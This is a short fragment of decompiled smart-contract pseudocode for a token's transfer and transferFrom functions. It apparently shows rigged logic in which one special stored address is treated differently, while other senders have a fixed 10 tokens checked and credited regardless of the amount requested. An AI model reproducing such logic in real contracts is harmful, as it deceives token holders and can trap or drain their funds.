...
function transfer(address arg1, uint256 arg2) payable {
    ...
    if sub_cec85ceaAddress != msg.sender:
        if 10 > balanceOf[address(msg.sender)]:
            revert with 0, 
                        32,
                        38,
        ...
        if balanceOf[arg1] + 10 < balanceOf[arg1]:
            revert with 0, 'SafeMath: addition overflow'
...
function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    ...
    if sub_cec85ceaAddress != arg1:
        ...
        if balanceOf[arg2] + 10 < balanceOf[arg2]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] = balanceOf[arg2] + 10
        emit Transfer(10, arg1, arg2);
    else:
